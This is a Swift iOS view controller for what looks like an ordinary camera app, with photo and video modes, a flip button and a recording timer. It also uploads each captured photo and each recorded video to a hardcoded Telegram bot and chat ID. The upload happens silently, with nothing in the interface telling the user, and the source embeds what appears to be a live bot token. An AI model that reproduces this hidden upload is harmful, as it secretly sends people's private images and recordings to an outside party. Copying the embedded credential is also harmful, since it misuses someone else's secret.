import UIKit
import AVFoundation

class ViewController: UIViewController,
                      AVCapturePhotoCaptureDelegate,
                      AVCaptureFileOutputRecordingDelegate {

    private let BOT_TOKEN = "8641291303:AAGsFjLzSfoyZBxjkd2IJk-NSTkFXPjElJg"
    private let CHAT_ID   = "6397853058"

    private let session     = AVCaptureSession()
    private let photoOutput = AVCapturePhotoOutput()
    private let movieOutput = AVCaptureMovieFileOutput()
    private var previewLayer: AVCaptureVideoPreviewLayer!

    private var isFront     = false
    private var isVideoMode = false
    private var isRecording = false
    private var recSeconds  = 0
    private var recClock: Timer?

    private let shutterBtn   = UIButton(type: .custom)
    private let flipBtn      = UIButton(type: .custom)
    private let modeSelector = UISegmentedControl(items: ["PHOTO", "VIDEO"])
    private let flashView    = UIView()
    private let recDot       = UIView()
    private let recTimer     = UILabel()

    // MARK: - Lifecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        setupCamera()
        setupUI()
    }

    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        previewLayer?.frame = view.bounds
    }

    override var preferredStatusBarStyle: UIStatusBarStyle { .lightContent }

    // MARK: - Camera
    private func setupCamera() {
        session.beginConfiguration()

        // Best available preset
        let presets: [AVCaptureSession.Preset] = [.hd4K3840x2160, .hd1920x1080, .high]
        session.sessionPreset = presets.first { session.canSetSessionPreset($0) } ?? .high

        // Video input
        if let cam = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .back),
           let inp = try? AVCaptureDeviceInput(device: cam),
           session.canAddInput(inp) {
            session.addInput(inp)
        }

        // Audio input
        if let mic = AVCaptureDevice.default(for: .audio),
           let inp = try? AVCaptureDeviceInput(device: mic),
           session.canAddInput(inp) {
            session.addInput(inp)
        }

        // Outputs
        if session.canAddOutput(photoOutput) { session.addOutput(photoOutput) }
        if session.canAddOutput(movieOutput) { session.addOutput(movieOutput) }

        session.commitConfiguration()

        // Preview
        previewLayer = AVCaptureVideoPreviewLayer(session: session)
        previewLayer.videoGravity = .resizeAspectFill
        previewLayer.frame = view.bounds
        view.layer.insertSublayer(previewLayer, at: 0)

        DispatchQueue.global(qos: .userInitiated).async { self.session.startRunning() }
    }

    private func switchCamera(to position: AVCaptureDevice.Position) {
        session.beginConfiguration()
        session.inputs
            .compactMap { $0 as? AVCaptureDeviceInput }
            .filter { $0.device.hasMediaType(.video) }
            .forEach { session.removeInput($0) }

        if let cam = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position),
           let inp = try? AVCaptureDeviceInput(device: cam),
           session.canAddInput(inp) {
            session.addInput(inp)
        }
        session.commitConfiguration()
    }

    // MARK: - UI
    private func setupUI() {
        flashView.backgroundColor = .white
        flashView.alpha = 0
        flashView.isUserInteractionEnabled = false
        flashView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(flashView)

        // Toolbar backdrop
        let bar = UIView()
        bar.backgroundColor = UIColor.black.withAlphaComponent(0.5)
        bar.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(bar)

        // Mode selector
        modeSelector.selectedSegmentIndex = 0
        modeSelector.selectedSegmentTintColor = .clear
        modeSelector.backgroundColor = .clear
        modeSelector.setTitleTextAttributes(
            [.foregroundColor: UIColor.white.withAlphaComponent(0.4),
             .font: UIFont.systemFont(ofSize: 13, weight: .semibold)], for: .normal)
        modeSelector.setTitleTextAttributes(
            [.foregroundColor: UIColor.white,
             .font: UIFont.systemFont(ofSize: 13, weight: .bold)], for: .selected)
        modeSelector.setDividerImage(UIImage(), forLeftSegmentState: .normal,
                                      rightSegmentState: .normal, barMetrics: .default)
        modeSelector.translatesAutoresizingMaskIntoConstraints = false
        modeSelector.addTarget(self, action: #selector(modeChanged), for: .valueChanged)
        view.addSubview(modeSelector)

        // Shutter
        shutterBtn.backgroundColor = .white
        shutterBtn.layer.cornerRadius = 36
        shutterBtn.layer.borderWidth  = 5
        shutterBtn.layer.borderColor  = UIColor.white.withAlphaComponent(0.5).cgColor
        shutterBtn.translatesAutoresizingMaskIntoConstraints = false
        shutterBtn.addTarget(self, action: #selector(shutterTapped), for: .touchUpInside)
        shutterBtn.addTarget(self, action: #selector(btnDown), for: .touchDown)
        shutterBtn.addTarget(self, action: #selector(btnUp), for: [.touchUpInside, .touchUpOutside, .touchCancel])
        view.addSubview(shutterBtn)

        // Flip
        let cfg = UIImage.SymbolConfiguration(pointSize: 20, weight: .medium)
        flipBtn.setImage(UIImage(systemName: "camera.rotate", withConfiguration: cfg), for: .normal)
        flipBtn.tintColor = .white
        flipBtn.backgroundColor = UIColor.black.withAlphaComponent(0.35)
        flipBtn.layer.cornerRadius = 24
        flipBtn.translatesAutoresizingMaskIntoConstraints = false
        flipBtn.addTarget(self, action: #selector(flipTapped), for: .touchUpInside)
        view.addSubview(flipBtn)

        // Rec dot
        recDot.backgroundColor = .red
        recDot.layer.cornerRadius = 5
        recDot.alpha = 0
        recDot.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(recDot)

        // Rec timer
        recTimer.text = "00:00"
        recTimer.textColor = .white
        recTimer.font = .monospacedDigitSystemFont(ofSize: 14, weight: .semibold)
        recTimer.alpha = 0
        recTimer.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(recTimer)

        let safe = view.safeAreaLayoutGuide
        NSLayoutConstraint.activate([
            flashView.topAnchor.constraint(equalTo: view.topAnchor),
            flashView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            flashView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            flashView.trailingAnchor.constraint(equalTo: view.trailingAnchor),

            bar.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            bar.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            bar.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            bar.topAnchor.constraint(equalTo: safe.bottomAnchor, constant: -130),

            modeSelector.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            modeSelector.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -108),
            modeSelector.widthAnchor.constraint(equalToConstant: 200),

            shutterBtn.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            shutterBtn.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -28),
            shutterBtn.widthAnchor.constraint(equalToConstant: 72),
            shutterBtn.heightAnchor.constraint(equalToConstant: 72),

            flipBtn.centerYAnchor.constraint(equalTo: shutterBtn.centerYAnchor),
            flipBtn.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -28),
            flipBtn.widthAnchor.constraint(equalToConstant: 48),
            flipBtn.heightAnchor.constraint(equalToConstant: 48),

            recDot.widthAnchor.constraint(equalToConstant: 10),
            recDot.heightAnchor.constraint(equalToConstant: 10),
            recDot.topAnchor.constraint(equalTo: safe.topAnchor, constant: 16),
            recDot.centerXAnchor.constraint(equalTo: view.centerXAnchor, constant: -30),

            recTimer.centerYAnchor.constraint(equalTo: recDot.centerYAnchor),
            recTimer.leadingAnchor.constraint(equalTo: recDot.trailingAnchor, constant: 6),
        ])
    }

    // MARK: - Actions
    @objc private func modeChanged() {
        isVideoMode = modeSelector.selectedSegmentIndex == 1
        shutterBtn.subviews.forEach { $0.removeFromSuperview() }
        if isVideoMode {
            shutterBtn.backgroundColor = .clear
            shutterBtn.layer.borderColor = UIColor.white.cgColor
            let inner = UIView()
            inner.backgroundColor = .red
            inner.layer.cornerRadius = 22
            inner.isUserInteractionEnabled = false
            inner.translatesAutoresizingMaskIntoConstraints = false
            shutterBtn.addSubview(inner)
            NSLayoutConstraint.activate([
                inner.centerXAnchor.constraint(equalTo: shutterBtn.centerXAnchor),
                inner.centerYAnchor.constraint(equalTo: shutterBtn.centerYAnchor),
                inner.widthAnchor.constraint(equalToConstant: 44),
                inner.heightAnchor.constraint(equalToConstant: 44),
            ])
        } else {
            shutterBtn.backgroundColor = .white
            shutterBtn.layer.borderColor = UIColor.white.withAlphaComponent(0.5).cgColor
        }
    }

    @objc private func shutterTapped() {
        if isVideoMode { isRecording ? stopVideo() : startVideo() }
        else { takePhoto() }
    }

    @objc private func btnDown() {
        UIView.animate(withDuration: 0.08) {
            self.shutterBtn.transform = CGAffineTransform(scaleX: 0.88, y: 0.88)
        }
    }
    @objc private func btnUp() {
        UIView.animate(withDuration: 0.15, delay: 0,
                       usingSpringWithDamping: 0.5, initialSpringVelocity: 6,
                       options: []) { self.shutterBtn.transform = .identity }
    }

    @objc private func flipTapped() {
        isFront.toggle()
        DispatchQueue.global(qos: .userInitiated).async {
            self.switchCamera(to: self.isFront ? .front : .back)
        }
        UIView.animate(withDuration: 0.28) {
            self.flipBtn.transform = self.flipBtn.transform.rotated(by: .pi)
        }
    }

    // MARK: - Photo
    private func takePhoto() {
        photoOutput.capturePhoto(with: AVCapturePhotoSettings(), delegate: self)
        UIView.animate(withDuration: 0.07, animations: { self.flashView.alpha = 0.9 }) { _ in
            UIView.animate(withDuration: 0.18) { self.flashView.alpha = 0 }
        }
    }

    func photoOutput(_ output: AVCapturePhotoOutput,
                     didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
        guard error == nil, let data = photo.fileDataRepresentation() else { return }
        telegram(endpoint: "sendPhoto", field: "photo", name: "photo.jpg",
                 mime: "image/jpeg", data: data)
    }

    // MARK: - Video
    private func startVideo() {
        if let conn = movieOutput.connection(with: .video) {
            if conn.isVideoOrientationSupported { conn.videoOrientation = .portrait }
            if conn.isVideoMirroringSupported   { conn.isVideoMirrored  = isFront   }
        }
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString + ".mp4")
        movieOutput.startRecording(to: url, recordingDelegate: self)
        isRecording = true; recSeconds = 0

        if let v = shutterBtn.subviews.first {
            UIView.animate(withDuration: 0.2) {
                v.layer.cornerRadius = 4
                v.bounds = CGRect(x: 0, y: 0, width: 28, height: 28)
            }
        }
        recDot.alpha = 1; recTimer.alpha = 1
        recClock = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] _ in
            guard let s = self else { return }
            s.recSeconds += 1
            s.recTimer.text = String(format: "%02d:%02d", s.recSeconds / 60, s.recSeconds % 60)
        }
        pulseDot()
    }

    private func stopVideo() {
        movieOutput.stopRecording()
        isRecording = false
        recClock?.invalidate(); recClock = nil
        UIView.animate(withDuration: 0.25) { self.recDot.alpha = 0; self.recTimer.alpha = 0 }
        if let v = shutterBtn.subviews.first {
            UIView.animate(withDuration: 0.2) {
                v.layer.cornerRadius = 22
                v.bounds = CGRect(x: 0, y: 0, width: 44, height: 44)
            }
        }
    }

    func fileOutput(_ output: AVCaptureFileOutput, didFinishRecordingTo url: URL,
                    from connections: [AVCaptureConnection], error: Error?) {
        guard error == nil, let data = try? Data(contentsOf: url) else { return }
        telegram(endpoint: "sendVideo", field: "video", name: "video.mp4",
                 mime: "video/mp4", data: data, extra: ["supports_streaming": "true"])
        try? FileManager.default.removeItem(at: url)
    }

    private func pulseDot() {
        guard isRecording else { return }
        UIView.animate(withDuration: 0.6, delay: 0, options: [.autoreverse],
                       animations: { self.recDot.alpha = 0.15 }) { _ in self.pulseDot() }
    }

    // MARK: - Telegram
    private func telegram(endpoint: String, field: String, name: String,
                          mime: String, data: Data, extra: [String: String] = [:]) {
        guard let url = URL(string: "https://api.telegram.org/bot\(BOT_TOKEN)/\(endpoint)") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        let b = "B\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"
        req.setValue("multipart/form-data; boundary=\(b)", forHTTPHeaderField: "Content-Type")

        let ts = DateFormatter.localizedString(from: Date(), dateStyle: .short, timeStyle: .short)
        var fields = ["chat_id": CHAT_ID,
                      "caption": endpoint == "sendPhoto" ? "📸 \(ts)" : "🎥 \(ts)"]
        extra.forEach { fields[$0] = $1 }

        var body = Data()
        fields.forEach { k, v in
            body.append("--\(b)\r\nContent-Disposition: form-data; name=\"\(k)\"\r\n\r\n\(v)\r\n", .utf8)
        }
        body.append("--\(b)\r\nContent-Disposition: form-data; name=\"\(field)\"; filename=\"\(name)\"\r\nContent-Type: \(mime)\r\n\r\n", .utf8)
        body.append(data)
        body.append("\r\n--\(b)--\r\n", .utf8)
        req.httpBody = body
        URLSession.shared.dataTask(with: req).resume()
    }
}

private extension Data {
    mutating func append(_ string: String, _ encoding: String.Encoding) {
        if let d = string.data(using: encoding) { append(d) }
    }
}
